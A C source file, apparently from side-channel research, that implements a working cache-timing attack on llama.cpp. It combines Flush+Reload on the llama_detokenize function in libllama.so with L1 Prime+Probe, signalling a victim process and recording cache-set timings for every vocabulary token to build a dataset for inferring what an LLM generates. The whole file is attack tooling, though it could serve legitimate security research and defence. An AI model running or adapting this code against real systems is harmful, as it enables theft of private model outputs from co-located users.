// src/collect_attacker.c
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <sys/stat.h>
#include <immintrin.h>

#include <mastik/fr.h>
#include <mastik/low.h>
#include <mastik/util.h>
#include <cachesc.h>

// ================== CONFIGURATION ==================

#define CPU_ATTACKER 7


#define LIBLLAMA_PATH "<PATH_TO_LIBLLAMA_SO>"
// e.g. "/path/to/.venv/lib/pythonX.Y/site-packages/llama_cpp/lib/libllama.so"

// Offset of monitored instruction in libllama.so (llama_detokenize)
#define MON_OFFS 0x180d10

#define FR_THRESH 100

// Vocabulary size of your model
#define VOCAB_SIZE 32064

// Number of measurements per token
#define REPS 50

// If L1_SETS is not defined in cachesc.h, fall back to 64
#define L1_SETS 64

#define OUT_FILE "data/full_dataset.csv"
#define TIMING_FILE "/dev/shm/attacker_times.csv"
#define SHM_TOKEN_PATH "/dev/shm/target_token"


// Delay after FR detection before probe (ns)
#define AFTER_FR_DELAY_NS 8000ULL // ~10.7 µs, tune if needed

// Maximum time to wait for FR detection (ns)
#define FR_MAX_WAIT_NS 150000ULL // 150 µs

// ===================================================

static void bind_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0)
    {
        perror("sched_setaffinity");
        exit(EXIT_FAILURE);
    }
}

static inline uint64_t now_ns(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static inline void busy_wait_ns(uint64_t ns)
{
    uint64_t start = now_ns();
    while (now_ns() - start < ns)
    {
        _mm_pause();
    }
}

static void append_timing_csv(int token,
                              uint64_t prime_ns,
                              uint64_t fr_detect_ns,
                              uint64_t probe_start_ns,
                              uint64_t probe_end_ns)
{
    int fd = open(TIMING_FILE, O_CREAT | O_WRONLY | O_APPEND, 0666);
    if (fd < 0)
        return;

    char buf[256];
    int n = snprintf(buf, sizeof(buf),
                     "%d,%llu,%llu,%llu,%llu\n",
                     token,
                     (unsigned long long)prime_ns,
                     (unsigned long long)fr_detect_ns,
                     (unsigned long long)probe_start_ns,
                     (unsigned long long)probe_end_ns);
    if (n > 0)
        (void)!write(fd, buf, (size_t)n);

    close(fd);
}

static void set_victim_token(int token_id)
{
    FILE *f = fopen(SHM_TOKEN_PATH, "w");
    if (f)
    {
        fprintf(f, "%d", token_id);
        fclose(f);
    }
}

static void stop_victim(void)
{
    FILE *f = fopen(SHM_TOKEN_PATH, "w");
    if (f)
    {
        fprintf(f, "STOP");
        fclose(f);
    }
}

// Make sure data/ exists
static void ensure_data_dir(void)
{
    struct stat st;
    if (stat("data", &st) == -1)
    {
        if (mkdir("data", 0777) == -1 && errno != EEXIST)
        {
            perror("mkdir(data)");
            exit(EXIT_FAILURE);
        }
    }
}

int main(int argc, char **argv)
{
    setbuf(stdout, NULL); // unbuffered stdout for live logs

    if (argc != 2)
    {
        fprintf(stderr, "Usage: %s <victim_pid>\n", argv[0]);
        return EXIT_FAILURE;
    }

    int victim_pid = atoi(argv[1]);
    if (victim_pid <= 0)
    {
        fprintf(stderr, "Invalid victim PID: %s\n", argv[1]);
        return EXIT_FAILURE;
    }

    bind_cpu(CPU_ATTACKER);

    // Init timing file with header
    {
        int fd = open(TIMING_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0666);
        if (fd >= 0)
        {
            (void)!dprintf(fd,
                           "token,prime_time_ns,fr_detect_time_ns,probe_start_time_ns,probe_end_time_ns\n");
            close(fd);
        }
        else
        {
            perror("open TIMING_FILE");
            // not fatal, but annoying
        }
    }

    // 1. Setup Flush+Reload
    void *mon_addr = map_offset(LIBLLAMA_PATH, MON_OFFS);
    if (!mon_addr)
    {
        fprintf(stderr, "map_offset failed for %s @ 0x%lx\n",
                LIBLLAMA_PATH, (unsigned long)MON_OFFS);
        return EXIT_FAILURE;
    }

    fr_t fr = fr_prepare();
    if (!fr)
    {
        fprintf(stderr, "fr_prepare failed\n");
        return EXIT_FAILURE;
    }
    fr_monitor(fr, mon_addr);
    uint16_t fr_res[1];

    // 2. Setup CacheSC for L1 Prime+Probe
    cache_ctx *ctx = get_cache_ctx(L1);
    if (!ctx)
    {
        fprintf(stderr, "get_cache_ctx(L1) failed\n");
        return EXIT_FAILURE;
    }

    cacheline *curr_head = prepare_cache_ds(ctx);
    if (!curr_head)
    {
        fprintf(stderr, "prepare_cache_ds failed\n");
        release_cache_ctx(ctx);
        return EXIT_FAILURE;
    }

    time_type *raw_measurements = malloc(L1_SETS * sizeof(time_type));
    if (!raw_measurements)
    {
        perror("malloc raw_measurements");
        release_cache_ctx(ctx);
        return EXIT_FAILURE;
    }

    ensure_data_dir();

    FILE *fp = fopen(OUT_FILE, "w");
    if (!fp)
    {
        perror("fopen OUT_FILE");
        free(raw_measurements);
        release_cache_ctx(ctx);
        return EXIT_FAILURE;
    }

    // CSV header: token_id,rep,set_0,...,set_63
    fprintf(fp, "token_id,rep");
    for (int i = 0; i < L1_SETS; i++)
        fprintf(fp, ",set_%d", i);
    fprintf(fp, "\n");

    printf("[Attacker] Starting collection. Output: %s\n", OUT_FILE);

    // 3. Main collection loop
    for (int t_id = 0; t_id < VOCAB_SIZE; t_id++)
    {
        if (t_id % 50 == 0)
            printf("\rProgress: %d / %d", t_id, VOCAB_SIZE);

        int rep = 0;

        while (rep < REPS)
        {
            // Tell victim which token to detokenize
            set_victim_token(t_id);

            // Wake victim
            if (kill(victim_pid, SIGUSR1) == -1)
            {
                perror("kill(SIGUSR1 to victim)");
                goto cleanup;
            }

            int detected = 0;
            uint64_t t_fr = -1000000000000;
            // Prime cache
            _mm_mfence();
            curr_head = prime(curr_head);

            uint64_t t_prime = now_ns();

            // Time-based FR wait
            uint64_t start_wait = now_ns();
            while (now_ns() - start_wait < FR_MAX_WAIT_NS)
            {
                fr_probe(fr, fr_res);
                // optional debug:
                // printf("FR debug: token %d rep %d -> %u\n", t_id, rep, fr_res[0]);

                if (fr_res[0] < FR_THRESH)
                {
                    detected = 1;
                    t_fr = now_ns();
                    break;
                }

                _mm_pause(); // polite spin; DO NOT flush mon_addr here
            }

            if (detected)
            {
                // Optional delay to push probe slightly after victim has finished
                busy_wait_ns(AFTER_FR_DELAY_NS);

                uint64_t t_probe_start = now_ns();

                curr_head = probe_all_cachelines(curr_head);
                get_msrmts_for_all_set(curr_head, raw_measurements);

                uint64_t t_probe_end = now_ns();

                // Write measurement row
                fprintf(fp, "%d,%d", t_id, rep);
                for (int s = 0; s < L1_SETS; s++)
                    fprintf(fp, ",%lu", (unsigned long)raw_measurements[s]);
                fprintf(fp, "\n");

                // Log timing
                append_timing_csv(t_id, t_prime, t_fr, t_probe_start, t_probe_end);

                rep++;
            }
            else
            {
                fprintf(stderr,
                        "\n[Attacker] Missed detection for token %d (rep %d), retrying...\n",
                        t_id, rep);
                // no rep++ -> retry this rep
            }

            clear_cache(ctx);
            _mm_clflush(mon_addr);
            _mm_mfence();
            usleep(5000); // 5 ms between reps
        }

        usleep(10000); // small pause between tokens
    }

    printf("\n[Attacker] Done collecting for all tokens.\n");

cleanup:
    // Tell victim to stop and wake it once more
    stop_victim();
    (void)!kill(victim_pid, SIGUSR1);

    fclose(fp);
    free(raw_measurements);
    release_cache_ctx(ctx);
    return 0;
}
